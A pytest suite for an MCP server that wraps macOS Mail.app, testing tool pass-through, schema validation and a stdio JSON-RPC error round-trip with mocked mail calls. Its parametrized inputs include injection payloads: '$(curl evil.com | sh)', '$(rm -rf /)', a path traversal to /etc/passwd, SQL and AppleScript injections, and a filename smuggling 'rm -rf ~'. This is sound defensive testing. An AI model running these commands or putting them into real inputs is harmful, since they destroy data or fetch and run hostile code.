"""Edge-case and protocol-shape tests for imail.mcp.

Complements tests/test_mcp.py (left untouched). All `imail.mail.*` calls are
mocked via unittest.mock.patch — no real osascript/Mail.app call ever happens
here, including in the negative-validation FastMCP tests below (those fail
schema validation before the underlying tool function is invoked).
"""
import asyncio
import subprocess
import sys
from unittest.mock import patch

import pytest

from imail import mcp


# ---------------------------------------------------------------------------
# doctor()
# ---------------------------------------------------------------------------

def test_doctor_success():
    with patch("imail.mcp.mail.doctor") as m:
        assert mcp.doctor() == "ok: Mail.app reachable"
        m.assert_called_once_with()


def test_doctor_propagates_runtime_error():
    with patch("imail.mcp.mail.doctor", side_effect=RuntimeError("Automation permission denied")):
        with pytest.raises(RuntimeError, match="Automation permission denied"):
            mcp.doctor()


def test_doctor_propagates_arbitrary_exception_type():
    with patch("imail.mcp.mail.doctor", side_effect=OSError("mail app not running")):
        with pytest.raises(OSError):
            mcp.doctor()


# ---------------------------------------------------------------------------
# list_accounts()
# ---------------------------------------------------------------------------

def test_list_accounts_returns_formatted_string():
    with patch("imail.mcp.mail.format_accounts", return_value="Google\tuser@gmail.com"):
        assert mcp.list_accounts() == "Google\tuser@gmail.com"


def test_list_accounts_empty_no_accounts_configured():
    with patch("imail.mcp.mail.format_accounts", return_value=""):
        assert mcp.list_accounts() == ""


def test_list_accounts_multiline():
    formatted = "A\ta@x.com\nB\tb@x.com"
    with patch("imail.mcp.mail.format_accounts", return_value=formatted):
        assert mcp.list_accounts() == formatted


def test_list_accounts_propagates_exception():
    with patch("imail.mcp.mail.format_accounts", side_effect=RuntimeError("boom")):
        with pytest.raises(RuntimeError):
            mcp.list_accounts()


# ---------------------------------------------------------------------------
# list_messages()
# ---------------------------------------------------------------------------

def test_list_messages_default_args_call_through():
    with patch("imail.mcp.mail.list_messages", return_value=[]) as m:
        result = mcp.list_messages()
        assert result == []
        m.assert_called_once_with(account="", mailbox="INBOX", limit=20)


@pytest.mark.parametrize("account", [
    "user@gmail.com",
    "unicode-éè中文",
    "emoji-\U0001f600",
    "'; DROP TABLE accounts; --",
    "$(rm -rf /)",
    "../../../etc/passwd",
    "a" * 500,
    "",
])
def test_list_messages_account_passed_through_unchanged(account):
    with patch("imail.mcp.mail.list_messages", return_value=[]) as m:
        mcp.list_messages(account=account)
        m.assert_called_once_with(account=account, mailbox="INBOX", limit=20)


@pytest.mark.parametrize("mailbox", [
    "INBOX",
    "Sent Items",
    "unicode-é中文",
    "'; DROP TABLE mailboxes; --",
    "\"tell application \\\"Finder\\\" to reboot\"",
])
def test_list_messages_mailbox_passed_through_unchanged(mailbox):
    with patch("imail.mcp.mail.list_messages", return_value=[]) as m:
        mcp.list_messages(mailbox=mailbox)
        m.assert_called_once_with(account="", mailbox=mailbox, limit=20)


@pytest.mark.parametrize("limit", [0, -1, 1, 20, 999999999999])
def test_list_messages_boundary_limits(limit):
    with patch("imail.mcp.mail.list_messages", return_value=[]) as m:
        mcp.list_messages(limit=limit)
        m.assert_called_once_with(account="", mailbox="INBOX", limit=limit)


def test_list_messages_empty_result():
    with patch("imail.mcp.mail.list_messages", return_value=[]):
        assert mcp.list_messages() == []


def test_list_messages_unicode_subjects_passed_through():
    fake = [
        {"subject": "你好 \U0001f600", "from": "a@x.com"},
        {"subject": "Résumé attaché", "from": "b@x.com"},
    ]
    with patch("imail.mcp.mail.list_messages", return_value=fake):
        assert mcp.list_messages() == fake


def test_list_messages_propagates_exception():
    with patch("imail.mcp.mail.list_messages", side_effect=RuntimeError("mailbox not found")):
        with pytest.raises(RuntimeError, match="mailbox not found"):
            mcp.list_messages(mailbox="Nonexistent")


# ---------------------------------------------------------------------------
# send_message()
# ---------------------------------------------------------------------------

def test_send_message_default_cc_and_attachments():
    with patch("imail.mcp.mail.send_message", return_value="sent") as m:
        result = mcp.send_message(
            from_addr="me@x.com", to="you@x.com", subject="hi", body="hello"
        )
        assert result == "sent"
        m.assert_called_once_with(
            to="you@x.com",
            subject="hi",
            body="hello",
            from_addr="me@x.com",
            cc="",
            attachments=None,
        )


@pytest.mark.parametrize("field,value", [
    ("from_addr", "unicode-é@x.com"),
    ("to", "emoji-\U0001f600@x.com"),
    ("to", "a@x.com, b@x.com; '; DROP TABLE users; --"),
    ("subject", "Re: 中文主题 \U0001f680"),
    ("subject", "<script>alert(1)</script>"),
    ("body", "line1\nline2\r\nunicode éè中文 emoji \U0001f4a3"),
    ("body", "$(curl evil.com | sh)"),
    ("cc", "cc-unicode-中文@x.com"),
])
def test_send_message_string_fields_passed_through_unchanged(field, value):
    kwargs = {
        "from_addr": "me@x.com",
        "to": "you@x.com",
        "subject": "subj",
        "body": "body",
    }
    kwargs[field] = value
    with patch("imail.mcp.mail.send_message", return_value="sent") as m:
        mcp.send_message(**kwargs)
        call_kwargs = m.call_args.kwargs
        assert call_kwargs[field] == value


def test_send_message_attachments_passed_through_unchanged():
    attachments = ["/tmp/éè.pdf", "/tmp/'; rm -rf ~; #.png"]
    with patch("imail.mcp.mail.send_message", return_value="sent") as m:
        mcp.send_message(
            from_addr="me@x.com", to="you@x.com", subject="s", body="b",
            attachments=attachments,
        )
        assert m.call_args.kwargs["attachments"] == attachments


def test_send_message_no_shared_mutable_default_across_calls():
    """attachments: list[str] = None is the None singleton, not a mutable
    default — two no-attachments calls must not leak state between them."""
    with patch("imail.mcp.mail.send_message", return_value="sent") as m:
        mcp.send_message(from_addr="a@x.com", to="b@x.com", subject="s1", body="b1")
        first_attachments = m.call_args.kwargs["attachments"]
        mcp.send_message(from_addr="a@x.com", to="b@x.com", subject="s2", body="b2")
        second_attachments = m.call_args.kwargs["attachments"]
        assert first_attachments is None
        assert second_attachments is None

    # Belt-and-suspenders: even if a caller mutated a returned list-like
    # object, a second call with an explicit empty list must not have been
    # contaminated by the first (no shared default object at all).
    with patch("imail.mcp.mail.send_message", return_value="sent") as m:
        mcp.send_message(from_addr="a@x.com", to="b@x.com", subject="s1", body="b1",
                          attachments=["one.pdf"])
        mcp.send_message(from_addr="a@x.com", to="b@x.com", subject="s2", body="b2")
        assert m.call_args.kwargs["attachments"] is None


def test_send_message_propagates_exception():
    with patch("imail.mcp.mail.send_message", side_effect=RuntimeError("account wall violation")):
        with pytest.raises(RuntimeError, match="account wall violation"):
            mcp.send_message(from_addr="wrong@x.com", to="you@x.com", subject="s", body="b")


def test_send_message_empty_strings_allowed_through():
    with patch("imail.mcp.mail.send_message", return_value="sent") as m:
        mcp.send_message(from_addr="", to="", subject="", body="")
        m.assert_called_once_with(to="", subject="", body="", from_addr="", cc="", attachments=None)


# ---------------------------------------------------------------------------
# Schema / protocol-shape tests against the real FastMCP object (in-process,
# no subprocess/stdio). Discovered via: mcp.mcp.list_tools() /
# mcp.mcp.call_tool(name, args) on installed `mcp` package (v2.1.1).
# ---------------------------------------------------------------------------

def _list_tools():
    return asyncio.run(mcp.mcp.list_tools())


def test_all_four_tools_registered():
    names = {t.name for t in _list_tools()}
    assert names == {"doctor", "list_accounts", "list_messages", "send_message"}


def test_doctor_schema_has_no_properties():
    tool = next(t for t in _list_tools() if t.name == "doctor")
    assert tool.input_schema["properties"] == {}


def test_list_accounts_schema_has_no_properties():
    tool = next(t for t in _list_tools() if t.name == "list_accounts")
    assert tool.input_schema["properties"] == {}


def test_list_messages_schema_matches_signature_defaults():
    tool = next(t for t in _list_tools() if t.name == "list_messages")
    props = tool.input_schema["properties"]
    assert props["account"]["default"] == ""
    assert props["mailbox"]["default"] == "INBOX"
    assert props["limit"]["default"] == 20
    assert tool.input_schema.get("required", []) == []


def test_send_message_schema_required_fields():
    tool = next(t for t in _list_tools() if t.name == "send_message")
    assert set(tool.input_schema["required"]) == {"from_addr", "to", "subject", "body"}


def test_send_message_schema_optional_defaults():
    tool = next(t for t in _list_tools() if t.name == "send_message")
    props = tool.input_schema["properties"]
    assert props["cc"]["default"] == ""
    assert props["attachments"]["default"] is None


def test_call_tool_missing_required_field_raises_validation_error():
    from mcp.server.mcpserver.exceptions import ToolError
    with pytest.raises(ToolError):
        asyncio.run(mcp.mcp.call_tool("send_message", {}))


def test_call_tool_missing_required_field_reports_each_missing_name():
    from mcp.server.mcpserver.exceptions import ToolError
    with pytest.raises(ToolError) as exc_info:
        asyncio.run(mcp.mcp.call_tool("send_message", {"from_addr": "a@x.com"}))
    message = str(exc_info.value)
    for field in ("to", "subject", "body"):
        assert field in message


def test_call_tool_wrong_type_limit_raises_validation_error():
    from mcp.server.mcpserver.exceptions import ToolError
    with pytest.raises(ToolError):
        asyncio.run(mcp.mcp.call_tool("list_messages", {"limit": "not-a-number"}))


def test_call_tool_wrong_type_does_not_invoke_underlying_mail_function():
    """A validation failure must short-circuit before mail.list_messages ever
    runs — otherwise a bad-type call could still reach osascript."""
    from mcp.server.mcpserver.exceptions import ToolError
    with patch("imail.mcp.mail.list_messages") as m:
        with pytest.raises(ToolError):
            asyncio.run(mcp.mcp.call_tool("list_messages", {"limit": "not-a-number"}))
        m.assert_not_called()


def test_call_tool_valid_args_reaches_mocked_mail_function():
    """Sanity check that call_tool's happy path really does dispatch to the
    underlying tool function (mocked here, so nothing real fires)."""
    with patch("imail.mcp.mail.list_messages", return_value=[]) as m:
        result = asyncio.run(mcp.mcp.call_tool("list_messages", {"limit": 5}))
        m.assert_called_once_with(account="", mailbox="INBOX", limit=5)
        assert result is not None


# ---------------------------------------------------------------------------
# One real (but Mail.app-free) stdio subprocess round-trip, guarded by a hard
# timeout so a hang can't stall the suite. This is the fallback path noted in
# the task brief for validation-error shape when the in-process API is
# awkward; here the in-process API worked fine (see tests above), but this
# extra check proves the *actual* JSON-RPC transport also returns a
# structured error rather than crashing the process on a bad-type argument.
# ---------------------------------------------------------------------------

def test_stdio_subprocess_returns_jsonrpc_error_on_bad_type_not_crash():
    import json

    proc = subprocess.Popen(
        [sys.executable, "-m", "imail.cli", "mcp"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1,
    )
    try:
        init = {
            "jsonrpc": "2.0", "id": 1, "method": "initialize",
            "params": {
                "protocolVersion": "2024-11-05",
                "capabilities": {},
                "clientInfo": {"name": "test", "version": "0"},
            },
        }
        proc.stdin.write(json.dumps(init) + "\n")
        proc.stdin.flush()
        init_resp = json.loads(proc.stdout.readline())
        assert "result" in init_resp

        notif = {"jsonrpc": "2.0", "method": "notifications/initialized"}
        proc.stdin.write(json.dumps(notif) + "\n")
        proc.stdin.flush()

        call = {
            "jsonrpc": "2.0", "id": 2, "method": "tools/call",
            "params": {"name": "list_messages", "arguments": {"limit": "not-a-number"}},
        }
        proc.stdin.write(json.dumps(call) + "\n")
        proc.stdin.flush()
        resp = json.loads(proc.stdout.readline())

        # Either a top-level JSON-RPC error, or a tool result marked isError —
        # both are "structured error", neither is a crash/hang.
        assert "error" in resp or resp.get("result", {}).get("isError") is True
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=5)


# ---------------------------------------------------------------------------
# run_server()
# ---------------------------------------------------------------------------

def test_run_server_calls_run_with_stdio_transport_kwarg(monkeypatch):
    calls = []
    monkeypatch.setattr(mcp.mcp, "run", lambda *a, **kw: calls.append((a, kw)))
    mcp.run_server()
    assert calls == [((), {"transport": "stdio"})]


def test_run_server_propagates_exception_from_run(monkeypatch):
    def boom(*args, **kwargs):
        raise RuntimeError("stdio pipe broke")
    monkeypatch.setattr(mcp.mcp, "run", boom)
    with pytest.raises(RuntimeError, match="stdio pipe broke"):
        mcp.run_server()
